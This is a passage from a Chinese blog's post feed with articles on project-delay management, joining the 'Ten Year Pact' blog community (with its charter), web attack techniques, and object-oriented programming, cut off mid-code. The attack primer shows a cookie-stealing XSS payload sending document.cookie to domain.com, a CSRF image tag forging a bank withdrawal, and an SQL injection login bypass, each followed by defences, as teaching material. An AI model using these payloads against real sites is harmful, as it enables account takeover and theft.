href="#4）制定异常问题的处理机制" class="headerlink" title="4）制定异常问题的处理机制"></a>4）制定异常问题的处理机制</h4><p>所有的异常情况，都需要设计一个应对的应对方案，有了应对方案，至少解决问题的流程有了，心理就不会慌。解决起来就容易很多。</p><h4 id="5）建立自己的问题清单库"><a href="#5）建立自己的问题清单库" class="headerlink" title="5）建立自己的问题清单库"></a>5）建立自己的问题清单库</h4><p>很多大公司都有这样一个产品问题清单库。客服同事在处理用户问题时候，通过关键字搜索就能找到通用的解决方案。这极大地提高了客服处理问题的效率。同样的方式其实也可以用在开发上。也许很久之前某个同事遇到的问题，其他同事也能遇到。这种情况下，通过关键字搜索，原来要花半天才能解决的问题，可能一分钟就给解决了。需要注意的是在做这个问题清单库的时候，一定要先定义好格式。这样才好管理。</p><p>那是不是做到上面这些就能保证项目能准时上线了？也不一定。因为这里面最关键的是执行的人。人的管理是一门艺术。这里以后再详细讲。</p><h3 id="3-项目结束后：对项目做复盘"><a href="#3-项目结束后：对项目做复盘" class="headerlink" title="3. 项目结束后：对项目做复盘"></a>3. 项目结束后：对项目做复盘</h3><p>复盘会：全员参与。</p><p>做的好的，要想办法将其标准化、可复制。</p><p>做的不好的，要想办法制定应对的方案。</p><h2 id="五、防止项目延期的几个方案"><a href="#五、防止项目延期的几个方案" class="headerlink" title="五、防止项目延期的几个方案"></a>五、防止项目延期的几个方案</h2><p>最后，说一下我在防止项目延期上的个人经验。</p><h3 id="1-大项目要分阶段转测试"><a href="#1-大项目要分阶段转测试" class="headerlink" title="1. 大项目要分阶段转测试"></a>1. 大项目要分阶段转测试</h3><p>不要把测试和设计工作都集中在一个时间段。版本迭代的时长也不要超过一个月。</p><h3 id="2-预留测试时间"><a href="#2-预留测试时间" class="headerlink" title="2. 预留测试时间"></a>2. 预留测试时间</h3><p>开发人员每次做完一个任务后，都要预留测试时间。同时和开发人员要达成一个共识，如果开过程中出现延期，要自己通过加班时间赶上进度，不能影响其他同事的进度。</p><h3 id="3-制定常见异常情况的处理标准"><a href="#3-制定常见异常情况的处理标准" class="headerlink" title="3. 制定常见异常情况的处理标准"></a>3. 制定常见异常情况的处理标准</h3><p>也就是最开始讲到的，如果真的有需求变更，那么就一定要做好变更需求的标准。需求可以变，变了之后如何处理。这个也需要明确。有些是可以直接放到版本里通过加班解决，有些可以舍弃掉一些需求。尽量不在要发布的时候做变更。</p><h3 id="4-做好PLAN-B计划"><a href="#4-做好PLAN-B计划" class="headerlink" title="4. 做好PLAN B计划"></a>4. 做好PLAN B计划</h3><p>遇到一些突发时间的预案是什么。比如有人员临时请求，怎么办？有技术难点攻克不了怎么办？作为管理者需要提前想好备选方案。</p><h3 id="5-制定两个发布计划"><a href="#5-制定两个发布计划" class="headerlink" title="5. 制定两个发布计划"></a>5. 制定两个发布计划</h3><p>一个计划是对内的，根据大家工作计划整合之后的发布时间，还有一个是对外上线的计划。我们团队要追求对内时间上线。但如果出现问题，预留出的时间就是我们的缓冲带。当然也可以对外给出一个模糊的上线时间，比如对内9月10号上线，对外9月中旬上线。</p><p>以上，是应对项目延期的一些经验。希望给大家带来一些启发。</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 需求 </tag>
            
            <tag> 项目管理 </tag>
            
            <tag> 初级 </tag>
            
            <tag> 延期 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>书房加入十年之约了</title>
      <link href="/325.html"/>
      <url>/325.html</url>
      
        <content type="html"><![CDATA[<p>非常有幸能够加入十年之约，本站在我不断折腾中坚挺了一年，同事（最开始引起我玩服务器的引路人）也是说我就是为了折腾而折腾，期间换了很多博客系统，具体可以查看<a href="https://blog.gjcloak.top/184.html">本篇文章</a>，感觉挺离谱的就是。</p><p>邹韬奋说的对：一个人做事，在动手之前，当然要详慎考虑；但是计划或方针已定之后，就要认定目标前进，不可再有迟疑不决的态度，这就是坚毅的态度。</p><p>确实，在搭建博客的这段时间，我想最多的不是想文章怎么写、博客怎么丰富内容，而是想体验各种各样的新内容（自动化、插件和主题），这个时候我已经有些偏离建博的初心了。再跟同事沟通后，觉得我需要找时间把自己的内容重新梳理下…</p><p>好吧，有点偏题了。</p><p>总之，今天成功加入了十年之约，希望在十年后，能够回忆我曾经来过互联网并留下过自己的足迹，顺便看看十年前的自己留下过什么“电子垃圾(bushi”。可能有人会问什么是十年之约？十年之约是一个记录所有成员的加入时间、履约情况、博客大事记、博客陨落时间等信息的非盈利的项目。</p><p>本站在十年之约的<a href="https://www.foreverblog.cn/blog/3866.html">这里</a>，同时也加入了虫洞项目</p><blockquote><p>虫洞是什么？我们的博客散布在浩瀚的互联网宇宙中，虽然同处十年之约这个星系当中，但是由于十年之约官网中成员列表的脑残设定，成员之间的博客互访非常麻烦。虫洞是连结两个遥远时空的空间隧道，通过虫洞您可以非常方便地随机访问十年之约成员的博客。</p></blockquote><p>下面在附上十年之约公约，有兴趣的小伙伴也可以点<a href="https://www.foreverblog.cn/treaty.html">这里</a>申请！</p><hr><h3 id="十年之约公约"><a href="#十年之约公约" class="headerlink" title="十年之约公约"></a>十年之约公约</h3><p>（2020年8月16日第三次修订）试行<br>在您加入“十年之约”之前，请承诺您会仔细阅读并遵守如下条文中的规定和要求。</p><h4 id="第一条-总则"><a href="#第一条-总则" class="headerlink" title="第一条 总则"></a>第一条 总则</h4><p>“十年之约”是由“十年之约”项目组维护的非营利性、自愿加入的博客活动。加入“十 年之约”可锻炼您的写作能力，进而提升您的思考、观察、记录、分享等能力，是 一项非常有意义的活动。“十年之约”的宗旨是：我们的博客十年不关闭或者更久， 并保持更新和活力。</p><h4 id="第二条-加入“十年之约”，-须同时满足如下条件"><a href="#第二条-加入“十年之约”，-须同时满足如下条件" class="headerlink" title="第二条 加入“十年之约”， 须同时满足如下条件"></a>第二条 加入“十年之约”， 须同时满足如下条件</h4><p>（一） 加入“十年之约”的博客，需具有独立的域名，域名的注册和使用符合ICANN 的要求。谢绝免费域名（如 tk、ml、ga 等），谢绝二级域名（如 co.cc，但com.cn 类型的除外）。如果您的博客正在使用二级域名，您必须拥有该二级域名对应主域名的所有权。</p><p>（二） 备案要求：加入“十年之约”的博客不限制是否备案。如果您的博客已备案，需保证您的备案信息为您个人的真实信息，且域名所有人与备案信息一致，并按工信部和公安机关的要求在博客页脚标注备案号。</p><p>（三） 内容要求：</p><p>生活记录类：加入“十年之约”的生活记录类博客，原则上需已建立 一年及以上，并已有15篇及以上的文章，其中原创文章占 75%以上。博客不得含有违反中国大陆相关法律法规的内容。</p><p>学习记录类：加入“十年之约”的学习记录类博客，原则上需已建立 一年及以上，并已有30篇及以上的文章，其中原创文章占 60%以上。博客不得含有违反中国大陆相关法律法规的内容。</p><p>（四） 优秀文章展示：凡加入十年之约的用户，可在加入满一年及以上向项目组申请站点加入十年之约RSS订阅地址：（<a href="http://rss.foreverblog.cn/">http://rss.foreverblog.cn/</a>）。</p><p>（五） 博客内容版权：加入“十年之约”的博客，博主需对其博客内容拥有全部版权。对于转载、引用的博文或片段，符合原作者的版权要求。其博客使用的程序、主题、框架等，在博客页脚或站内相关页面有明确的版权声明。对产生版权纠纷的博客，我们会将其进行违约处理。</p><p>（六） 不允许加入“十年之约”的博客：（1）非博客类型的网站；（2）宣扬暴力、血腥、战争、歧视等；（3）涉及黑产、灰产，传播淫秽色情，以及存在为涉及此类内容的网站打广告的情形；（4）纯采集、纯转载类、纯搬运类；（5）造谣、传播谣言；（6）含有诽谤他人、无端对他人进行人身攻击等侵犯他人权利的内容；（7）含有其他违反中国法律法规和地方性行政规定的内容。</p><h4 id="第三条-加入“十年之约”的方法"><a href="#第三条-加入“十年之约”的方法" class="headerlink" title="第三条 加入“十年之约”的方法"></a>第三条 加入“十年之约”的方法</h4><p>（一） 在“十年之约”官方网站按要求如实提交您的资料，项目组 将按第二条审核您的申请，并通过邮箱发送申请结果。</p><h4 id="第四条-审核人员要求"><a href="#第四条-审核人员要求" class="headerlink" title="第四条 审核人员要求"></a>第四条 审核人员要求</h4><p>（一） 当用户提交后，审核人员会在15个工作日内对内容进行审核，由于一些不确定因素，最长不超过30个工作日。</p><p>（二） 当用户信息发生变更或修改时，审核人员会在10-30个工作日进行处理，信息修改请移步个人专属页面留言。</p><p>（三） 审核人员在审核时，如果肆意将公约内不强制要求的条件视为重要条件，或将不具有优先级的条件作为优先条件，或将不符合公约要求的博客以包括但不限于“已备案”、“使用.cn域名”等条件将其审核通过的，或故意引导博主注册特定域名后缀、在特定注册商注册、在特定地区注册等情况，将被逐出审核人员队伍，永不录用，情节严重的将对其个人博客标记违约处理。</p><h4 id="第五条-加入“十年之约”后，您享受的权利"><a href="#第五条-加入“十年之约”后，您享受的权利" class="headerlink" title="第五条 加入“十年之约”后，您享受的权利"></a>第五条 加入“十年之约”后，您享受的权利</h4><p>（一） 您可邀请他人加入“十年之约”，但被邀请的博客需满足第二条的要求。</p><p>（二） 在必要的情况下，您可自由退出“十年之约”，但退出前需向项目组提交申请说明退出理由</p><h4 id="第六条-违规判断及处理"><a href="#第六条-违规判断及处理" class="headerlink" title="第六条 违规判断及处理"></a>第六条 违规判断及处理</h4><p>（一） 博客停止更新长达6个月及以上的，项目组会以邮件形式联系博主确认是否还在维护，若已确认不再维护或项目组邮件发出的一个月内没有回复，则记录违约；</p><p>（二） 博客在三个月内连续水文或发布无营养内容超过10篇，项目组会以邮件形式进行提示，如未做出修改的标记违约；</p><p>（三） 博客若出现删库或长时间无法打开长达7个自然日，未向项目组申报或记录违约长达30天的，按原公约进行申请；</p><p>（四） 博客类型发生变更（包括但不限于纯搬运、采集、广告、下载、影视、博彩、信贷、金融等具有商业性质或违法性质内容），或不再符合个人独立博客类型的，记录违约;</p><p>（五） 标记违约后的30天内，若博客整改至符合十年公约要求，可发送邮件至项目组邮箱申请恢复，项目组将于收到申请后评议是否予以恢复，并将结果通过邮件反馈。标记违约后仅受理一次恢复申请，且标记违约超过30天的博客将不再接受恢复申请。</p><h4 id="第七条-隐私条款"><a href="#第七条-隐私条款" class="headerlink" title="第七条 隐私条款"></a>第七条 隐私条款</h4><p>（一） 加入“十年之约”后，您提供的邮箱需要支持 Gravatar 头像，该头像将用于在“十年之约”官方网站上公开展示。</p><p>（二） 加入“十年之约”后，同意“十年之约”官方网站抓取您博客的 RSS 并在官网公开展示。该功能用于展示各位博友的最近更新，便于其他成员访问。若您不希望“十年之约”展示您的最近更新，可向项目组说明。</p><p>（三） 加入“十年之约”后，同意“十年之约”官方网站记录您的昵称、电子邮箱、博客描述、博客关键词等信息，项目组承诺会对您的电子邮箱等隐私信息进行严格保密，如有其他信息需要保密，可向项目组说明。</p><p>（四） 加入“十年之约”后，如您的博客提前关闭，同意“十年之约”项目组记录您博客的关闭时间，并在官网公示。</p><p>#### 第八条 “十年之约”项目组倡导之博友精神</p><p>（一） 守法。“十年之约”成员的博客建立、维护均遵守相关的法律法规。如果博客在境内主机建立，则经过合法的 ICP 备案且信息真实有效。如果博客在境外主机建立，则符合主机所在地有关法律法规的要求。博客所使用的域名和主机会及时续费。尊重他人知识产权和版权，未经原作者授权，不转发、转卖、转赠、公开分享他人的知识产物（包括但不限于付费的模板、插件、文章、图片、源码等）。</p><p>（二） 平等。无论“十年之约”的成员来自哪里、是男性还是女性、年龄大小、工作类型、使用的是什么域名和主机、主机在境外还是境内、主机和域名的价格高低、文笔好坏、更新频率快或慢等，均人人平等。</p><p>（三） 互访。“十年之约”的成员间，会经常对博客进行互访，常来常往。</p><p>（四） 互助。“十年之约”的成员如发生博客故障、域名解析失败、主机问题、被垃圾评论攻击等，其他成员会在自己能力范围内予以一定的帮助，如有特殊要求，可付费帮助。但提问者必须独立思考，事先利用官方网站帮助页面、搜索引擎等查找资料并尝试解决问题。如遇到不自行查找资料，直接提问的成员，其他成员有权拒绝提供帮助。</p><p>（五） 互敬。“十年之约”的成员会尊重其他成员的工作性质、个人习惯、宗教信仰等。</p><p>（六） 活力。“十年之约”的成员，拥有写博的热情，保持博客的活力。</p><p>（七） 真诚。“十年之约”的成员，真诚对待其他成员，在博客留言时，不说谎话、假话 、套话，不 留 虚 假 信 息 欺 骗 他 人 （ 如 将 邮 箱 写 成 <a href="mailto:qq@qq.com">qq@qq.com</a> 或<a href="mailto:admin@qq.com">admin@qq.com</a>），不留无意义的和垃圾评论（如仅仅写“学习了”或提交无关评论）。如对其博文观点有异议，可以在遵守所有博友精神的基础上展开辩论，但不得进行人身攻击、诽谤造谣等违法行为。</p><p>十年之约项目组有制定、修改与解释本公约的权利，本公约内容如有变更，将在官网通知，如有异议，请联系项目组。</p><p>本“公约”自 2020 年 8 月 16 日起试行。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> 十年之约 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻击技术</title>
      <link href="/321.html"/>
      <url>/321.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、跨站脚本攻击"><a href="#一、跨站脚本攻击" class="headerlink" title="一、跨站脚本攻击"></a>一、跨站脚本攻击</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。</p><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>之后该内容可能会被渲染成以下形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul><li>窃取用户的 Cookie</li><li>伪造虚假的输入表单骗取个人信息</li><li>显示伪造的文章或者图片</li></ul><h3 id="防范手段"><a href="#防范手段" class="headerlink" title="防范手段"></a>防范手段</h3><h4 id="1-设置-Cookie-为-HttpOnly"><a href="#1-设置-Cookie-为-HttpOnly" class="headerlink" title="1. 设置 Cookie 为 HttpOnly"></a>1. 设置 Cookie 为 HttpOnly</h4><p>设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。</p><h4 id="2-过滤特殊字符"><a href="#2-过滤特殊字符" class="headerlink" title="2. 过滤特殊字符"></a>2. 过滤特殊字符</h4><p>例如将 <code>&lt;</code> 转义为 <code>&amp;lt;</code>，将 <code>&gt;</code> 转义为 <code>&amp;gt;</code>，从而避免 HTML 和 Jascript 代码的运行。</p><p>富文本编辑器允许用户输入 HTML 代码，就不能简单地将 <code>&lt;</code> 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。</p><p>富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。</p><p>以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 id=&quot;title&quot;&gt;XSS Demo&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;123&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;input type=&quot;text&quot; name=&quot;q&quot; value=&quot;test&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;hello&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">alert(/xss/);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;XSS Demo&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;123&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&amp;lt;form&amp;gt;</span><br><span class="line">  &amp;lt;input type=&quot;text&quot; name=&quot;q&quot; value=&quot;test&quot;&amp;gt;</span><br><span class="line">&amp;lt;/form&amp;gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;hello&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&amp;lt;script type=&quot;text/javascript&quot;&amp;gt;</span><br><span class="line">alert(/xss/);</span><br><span class="line">&amp;lt;/script&amp;gt;</span><br></pre></td></tr></table></figure><blockquote><p><a href="http://jsxss.com/zh/try.html">XSS 过滤在线测试</a></p></blockquote><h2 id="二、跨站请求伪造"><a href="#二、跨站请求伪造" class="headerlink" title="二、跨站请求伪造"></a>二、跨站请求伪造</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。</p><p>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。</p><h3 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>假如一家银行用以执行转账操作的 URL 地址如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。</span><br></pre></td></tr></table></figure><p>那么，一个恶意攻击者可以在另一个网站上放置如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;。</span><br></pre></td></tr></table></figure><p>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。</p><p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p><p>通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p><h3 id="防范手段-1"><a href="#防范手段-1" class="headerlink" title="防范手段"></a>防范手段</h3><h4 id="1-检查-Referer-首部字段"><a href="#1-检查-Referer-首部字段" class="headerlink" title="1. 检查 Referer 首部字段"></a>1. 检查 Referer 首部字段</h4><p>Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。</p><p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p><h4 id="2-添加校验-Token"><a href="#2-添加校验-Token" class="headerlink" title="2. 添加校验 Token"></a>2. 添加校验 Token</h4><p>在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。</p><h4 id="3-输入验证码"><a href="#3-输入验证码" class="headerlink" title="3. 输入验证码"></a>3. 输入验证码</h4><p>因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。</p><h2 id="三、SQL-注入攻击"><a href="#三、SQL-注入攻击" class="headerlink" title="三、SQL 注入攻击"></a>三、SQL 注入攻击</h2><h3 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h3><p>服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。</p><h3 id="攻击原理-2"><a href="#攻击原理-2" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>例如一个网站登录验证的 SQL 查询代码为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strSQL = &quot;SELECT * FROM users WHERE (name = &#x27;&quot; + userName + &quot;&#x27;) and (pw = &#x27;&quot;+ passWord +&quot;&#x27;);&quot;</span><br></pre></td></tr></table></figure><p>如果填入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">userName = &quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;;</span><br><span class="line">passWord = &quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;;</span><br></pre></td></tr></table></figure><p>那么 SQL 查询字符串为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strSQL = &quot;SELECT * FROM users WHERE (name = &#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;) and (pw = &#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;);&quot;</span><br></pre></td></tr></table></figure><p>此时无需验证通过就能执行以下查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strSQL = &quot;SELECT * FROM users;&quot;</span><br></pre></td></tr></table></figure><h3 id="防范手段-2"><a href="#防范手段-2" class="headerlink" title="防范手段"></a>防范手段</h3><h4 id="1-使用参数化查询"><a href="#1-使用参数化查询" class="headerlink" title="1. 使用参数化查询"></a>1. 使用参数化查询</h4><p>Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PreparedStatement stmt = connection.prepareStatement(&quot;SELECT * FROM users WHERE userid=? AND password=?&quot;);</span><br><span class="line">stmt.setString(1, userid);</span><br><span class="line">stmt.setString(2, password);</span><br><span class="line">ResultSet rs = stmt.executeQuery();</span><br></pre></td></tr></table></figure><h4 id="2-单引号转换"><a href="#2-单引号转换" class="headerlink" title="2. 单引号转换"></a>2. 单引号转换</h4><p>将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。</p><h2 id="四、拒绝服务攻击"><a href="#四、拒绝服务攻击" class="headerlink" title="四、拒绝服务攻击"></a>四、拒绝服务攻击</h2><p>拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p><p>分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC">维基百科：跨站脚本</a></li><li><a href="https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A">维基百科：SQL 注入攻击</a></li><li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">维基百科：跨站点请求伪造</a></li><li><a href="https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A">维基百科：拒绝服务攻击</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门指南 </tag>
            
            <tag> 攻击技术 </tag>
            
            <tag> 方法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面向对象思想</title>
      <link href="/317.html"/>
      <url>/317.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、三大特性"><a href="#一、三大特性" class="headerlink" title="一、三大特性"></a>一、三大特性</h2><h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p>利用抽象数据类型将数据和基于数据的操作封装在一起，使其构成一个不可分割的独立实体。数据被保护在抽象数据类型的内部，尽可能地隐藏内部的细节，只保留一些对外的接口使其与外部发生联系。用户无需关心对象内部的细节，但可以通过对象对外提供的接口来访问该对象。</p><p>优点：</p><ul><li>减少耦合：可以独立地开发、测试、优化、使用、理解和修改</li><li>减轻维护的负担：可以更容易被理解，并且在调试的时候可以不影响其他模块</li><li>有效地调节性能：可以通过剖析来确定哪些模块影响了系统的性能</li><li>提高软件的可重用性</li><li>降低了构建大型系统的风险：即使整个系统不可用，但是这些独立的模块却有可能是可用的</li></ul><p>以下 Person 类封装 name、gender、age 等属性，外界只能通过 get() 方法获取一个 Person 对象的 name 属性和 gender 属性，而无法获取 age 属性，但是 age 属性可以供 work() 方法使用。</p><p>注意到 gender 属性使用 int 数据类型进行存储，封装使得用户注意不到这种实现细节。并且在需要修改 gender 属性使用的数据类型时，也可以在不影响客户端代码的情况下进行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public class Person &#123;</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line">    private int gender;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getGender() &#123;</span><br><span class="line">        return gender == 0 ? &quot;man&quot; : &quot;woman&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void work() &#123;</span><br><span class="line">        if (18 &lt;= age &amp;&amp; age &lt;= 50) &#123;</span><br><span class="line">            System.out.println(name + &quot; is working very hard!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            System.out.println(name + &quot; can&#x27;t work any more!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>继承实现了 <strong>IS-A</strong> 关系，例如 Cat 和 Animal 就是一种 IS-A 关系，因此 Cat 可以继承自 Animal，从而获得 Animal 非 private 的属性和方法。</p><p>继承应该遵循里氏替换原则，子类对象必须能够替换掉所有父类对象。</p><p>Cat 可以当做 Animal 来使用，也就是说可以使用 Animal 引用 Cat 对象。父类引用指向子类对象称为 <strong>向上转型</strong> 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Animal animal = new Cat();</span><br></pre></td></tr></table></figure><h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p>多态分为编译时多态和运行时多态：</p><ul><li>编译时多态主要指方法的重载</li><li>运行时多态指程序中定义的对象引用所指向的具体类型在运行期间才确定</li></ul><p>运行时多态有三个条件：</p><ul><li>继承</li><li>覆盖（重写）</li><li>向上转型</li></ul><p>下面的代码中，乐器类（Instrument）有两个子类：Wind 和 Percussion，它们都覆盖了父类的 play() 方法，并且在 main() 方法中使用父类 Instrument 来引用 Wind 和 Percussion 对象。在 Instrument 引用调用 play() 方法时，会执行实际引用对象所在类的 play() 方法，而不是 Instrument 类的方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class Instrument &#123;</span><br><span class="line"></span><br><span class="line">    public void play() &#123;</span><br><span 